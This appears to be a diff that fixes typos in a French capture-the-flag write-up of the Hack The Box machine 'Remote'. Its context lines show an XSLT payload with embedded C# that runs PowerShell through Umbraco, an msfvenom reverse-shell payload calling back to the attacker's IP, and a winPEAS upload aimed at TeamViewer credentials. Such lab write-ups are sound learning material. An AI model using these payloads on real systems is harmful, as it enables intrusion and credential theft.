@@ -219,7 +219,7 @@ Réponse:
 1d26f8b1232d0f8dca84ba8d93b39f94 
 ~~~
 
-# Root.txt
+## 2. Root.txt
 
 ~~~
 <?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "-NoProfile -Command ls C:\\Windows\\"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>
@@ -340,7 +340,7 @@ Directory: C:\Windows\RemotePackages Mode LastWriteTime Length Name ---- -------
 
 TeamViewer est en marche
 
-On change de méthose et on crée un reverse shell:
+On change de méthode et on crée un reverse shell:
 
 ~~~
 root@Host-001:~/Bureau/htb/Remote# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.53 LPORT=1234 -f exe > payload.exe 
@@ -659,9 +659,9 @@ exploit.py  payload.exe  winPEAS.exe
 root@Host-001:~/Bureau/htb/Remote# 
 ~~~
 
-On upload winPeas via l'interface d'Umbraco comme pr le payload
+On upload winPeas via l'interface d'Umbraco comme pour le payload
 
-On lance winPEAS et on a confirmation que teamviewer est en marche
+On lance winPEAS et on a confirmation que Teamviewer est en marche
 
 Ref: [https://www.rapid7.com/db/modules/post/windows/gather/credentials/teamviewer_passwords](https://www.rapid7.com/db/modules/post/windows/gather/credentials/teamviewer_passwords)
 
